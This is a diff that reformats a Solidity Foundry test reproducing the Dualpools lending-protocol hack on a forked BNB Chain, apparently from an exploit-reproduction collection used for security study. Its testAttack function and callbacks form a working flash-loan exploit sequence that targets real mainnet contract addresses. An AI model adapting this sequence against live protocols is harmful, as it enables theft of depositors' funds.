@@ -1,5 +1,6 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.10;
+
 import "forge-std/Test.sol";
 
 import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
@@ -22,24 +23,22 @@ import {IUniswapV3Pair} from "src/interfaces/IUniswapV3Pair.sol";
 // https://lunaray.medium.com/dualpools-hack-analysis-5209233801fa
 
 interface IMarketFacet {
+
     function isComptroller() external pure returns (bool);
 
-    function liquidateCalculateSeizeTokens(
-        address vTokenBorrowed,
-        address vTokenCollateral,
-        uint256 actualRepayAmount
-    ) external view returns (uint256, uint256);
+    function liquidateCalculateSeizeTokens(address vTokenBorrowed, address vTokenCollateral, uint256 actualRepayAmount)
+        external
+        view
+        returns (uint256, uint256);
 
-    function liquidateVAICalculateSeizeTokens(
-        address vTokenCollateral,
-        uint256 actualRepayAmount
-    ) external view returns (uint256, uint256);
+    function liquidateVAICalculateSeizeTokens(address vTokenCollateral, uint256 actualRepayAmount)
+        external
+        view
+        returns (uint256, uint256);
 
     // function checkMembership(address account, VToken vToken) external view returns (bool);
 
-    function enterMarkets(
-        address[] calldata vTokens
-    ) external returns (uint256[] memory);
+    function enterMarkets(address[] calldata vTokens) external returns (uint256[] memory);
 
     function exitMarket(address vToken) external returns (uint256);
 
@@ -50,9 +49,11 @@ interface IMarketFacet {
     // function getAllMarkets() external view returns (VToken[] memory);
 
     function updateDelegate(address delegate, bool allowBorrows) external;
+
 }
 
 interface VBep20Interface {
+
     function transfer(address dst, uint256 amount) external returns (bool);
 
     function approve(address spender, uint256 amount) external returns (bool);
@@ -66,10 +67,7 @@ interface VBep20Interface {
 
     function mint() external payable;
 
-    function mintBehalf(
-        address receiver,
-        uint256 mintAmount
-    ) external returns (uint256);
+    function mintBehalf(address receiver, uint256 mintAmount) external returns (uint256);
 
     function redeem(uint256 redeemTokens) external returns (uint256);
 
@@ -79,10 +77,7 @@ interface VBep20Interface {
 
     function repayBorrow(uint256 repayAmount) external returns (uint256);
 
-    function repayBorrowBehalf(
-        address borrower,
-        uint256 repayAmount
-    ) external returns (uint256);
+    function repayBorrowBehalf(address borrower, uint256 repayAmount) external returns (uint256);
 
     // function liquidateBorrow(
     //     address borrower,
@@ -94,9 +89,11 @@ interface VBep20Interface {
      * Admin Functions **
      */
     function _addReserves(uint256 addAmount) external returns (uint256);
+
 }
 
 contract ContractTest is Test {
+
     IWETH private WBNB = IWETH(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
     IERC20 private LINK = IERC20(0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD);
     IERC20 private BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
@@ -104,40 +101,25 @@ contract ContractTest is Test {
     IERC20 private ETH = IERC20(0x2170Ed0880ac9A755fd29B2688956BD959F933F8);
     IERC20 private ADA = IERC20(0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47);
 
-    VBep20Interface private vLINK =
-        VBep20Interface(0x650b940a1033B8A1b1873f78730FcFC73ec11f1f);
-    VBep20Interface private vBUSD =
-        VBep20Interface(0xfD5840Cd36d94D7229439859C0112a4185BC0255);
-    VBep20Interface private vWBNB =
-        VBep20Interface(0xA07c5b74C9B40447a954e1466938b865b6BBea36);
+    VBep20Interface private vLINK = VBep20Interface(0x650b940a1033B8A1b1873f78730FcFC73ec11f1f);
+    VBep20Interface private vBUSD = VBep20Interface(0xfD5840Cd36d94D7229439859C0112a4185BC0255);
+    VBep20Interface private vWBNB = VBep20Interface(0xA07c5b74C9B40447a954e1466938b865b6BBea36);
 
-    VBep20Interface private dLINK =
-        VBep20Interface(0x8fBCC81E5983d8347495468122c65E2Dc274eed9);
-    VBep20Interface private dBTCB =
-        VBep20Interface(0xB51F589BD9f69a0089c315521EE2FC848bAB6C0c);
-    VBep20Interface private dWBNB =
-        VBep20Interface(0xB5aAaCcFd69EA45b1A5Aa7E9c7a5e0DB2ce4357e);
-    VBep20Interface private dETH =
-        VBep20Interface(0x5F4a5252880b393a8cc4c01bBA4486Cf7a76075A);
-    VBep20Interface private dADA =
-        VBep20Interface(0xb2cf43E119BFC41554c4445f1867dc9F4cf69deD);
-    VBep20Interface private dBUSD =
-        VBep20Interface(0x514e2A29e98D49C676c93c5805cb83891CE6a9F5);
+    VBep20Interface private dLINK = VBep20Interface(0x8fBCC81E5983d8347495468122c65E2Dc274eed9);
+    VBep20Interface private dBTCB = VBep20Interface(0xB51F589BD9f69a0089c315521EE2FC848bAB6C0c);
+    VBep20Interface private dWBNB = VBep20Interface(0xB5aAaCcFd69EA45b1A5Aa7E9c7a5e0DB2ce4357e);
+    VBep20Interface private dETH = VBep20Interface(0x5F4a5252880b393a8cc4c01bBA4486Cf7a76075A);
+    VBep20Interface private dADA = VBep20Interface(0xb2cf43E119BFC41554c4445f1867dc9F4cf69deD);
+    VBep20Interface private dBUSD = VBep20Interface(0x514e2A29e98D49C676c93c5805cb83891CE6a9F5);
 
-    IMarketFacet VenusProtocol =
-        IMarketFacet(0xfD36E2c2a6789Db23113685031d7F16329158384);
-    IMarketFacet Dualpools =
-        IMarketFacet(0x5E5e28029eF37fC97ffb763C4aC1F532bbD4C7A2);
+    IMarketFacet VenusProtocol = IMarketFacet(0xfD36E2c2a6789Db23113685031d7F16329158384);
+    IMarketFacet Dualpools = IMarketFacet(0x5E5e28029eF37fC97ffb763C4aC1F532bbD4C7A2);
 
-    IDPPOracle DPPOracle_0x1b52 =
-        IDPPOracle(0x1B525b095b7353c5854Dbf6B0BE5Aa10F3818FaC);
-    IDPPOracle DPPOracle_0x8191 =
-        IDPPOracle(0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d);
+    IDPPOracle DPPOracle_0x1b52 = IDPPOracle(0x1B525b095b7353c5854Dbf6B0BE5Aa10F3818FaC);
+    IDPPOracle DPPOracle_0x8191 = IDPPOracle(0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d);
 
-    IPancakePair pancakeSwap =
-        IPancakePair(0x824eb9faDFb377394430d2744fa7C42916DE3eCe); // LINK-WBNB
-    IUniswapV3Pair pool =
-        IUniswapV3Pair(0x172fcD41E0913e95784454622d1c3724f546f849);
+    IPancakePair pancakeSwap = IPancakePair(0x824eb9faDFb377394430d2744fa7C42916DE3eCe); // LINK-WBNB
+    IUniswapV3Pair pool = IUniswapV3Pair(0x172fcD41E0913e95784454622d1c3724f546f849);
 
     function setUp() public {
         vm.createSelectFork("bsc", 36_145_772 - 1);
@@ -171,54 +153,25 @@ contract ContractTest is Test {
 
     function testAttack() public {
         approveAll();
-        DPPOracle_0x1b52.flashLoan(
-            7_001_000_000_000_000_000,
-            0,
-            address(this),
-            new bytes(1)
-        ); // borrow BUSD
+        DPPOracle_0x1b52.flashLoan(7_001_000_000_000_000_000, 0, address(this), new bytes(1)); // borrow BUSD
     }
 
-    function DPPFlashLoanCall(
-        address sender,
-        uint256 baseAmount,
-        uint256 quoteAmount,
-        bytes calldata data
-    ) external {
+    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
         console.log(msg.sender);
         if (msg.sender == address(DPPOracle_0x1b52)) {
             pancakeSwap.swap(0, 1000, address(this), data); // pancakeCall , swap BUSD to LINK
             BUSD.transfer(address(DPPOracle_0x1b52), 7_001_000_000_000_000_000);
         } else if (msg.sender == address(DPPOracle_0x8191)) {
-            pool.flash(
-                address(this),
-                70_000_000_000_000_000_000_000,
-                0,
-                new bytes(1)
-            ); // v3call , borrow BUSD
+            pool.flash(address(this), 70_000_000_000_000_000_000_000, 0, new bytes(1)); // v3call , borrow BUSD
             WBNB.transfer(address(pancakeSwap), 59);
         }
     }
 
-    function pancakeCall(
-        address sender,
-        uint256 amount0,
-        uint256 amount1,
-        bytes calldata data
-    ) external {
-        DPPOracle_0x8191.flashLoan(
-            312_497_349_377_117_598_837,
-            154_451_704_908_346_387_787_280,
-            address(this),
-            data
-        ); // borrow WBNB and BUSD
+    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
+        DPPOracle_0x8191.flashLoan(312_497_349_377_117_598_837, 154_451_704_908_346_387_787_280, address(this), data); // borrow WBNB and BUSD
     }
 
-    function pancakeV3FlashCallback(
-        uint256 fee0,
-        uint256 fee1,
-        bytes calldata data
-    ) external {
+    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
         address[] memory tokenList = new address[](2);
         tokenList[0] = address(vBUSD);
         tokenList[1] = address(vWBNB);
@@ -247,10 +200,7 @@ contract ContractTest is Test {
         vWBNB.redeem(1_320_879_335_222);
 
         // BUSD.transfer(address(this), 7001000000000000000); // not necessary
-        BUSD.transfer(
-            address(DPPOracle_0x8191),
-            154_451_704_908_346_387_787_280
-        );
+        BUSD.transfer(address(DPPOracle_0x8191), 154_451_704_908_346_387_787_280);
         BUSD.transfer(address(pool), 70_007_000_000_000_000_000_000);
 
         WBNB.deposit{value: 362_571_904_345_528_150_166}();
@@ -259,4 +209,5 @@ contract ContractTest is Test {
 
     receive() external payable {}
     fallback() external payable {}
+
 }
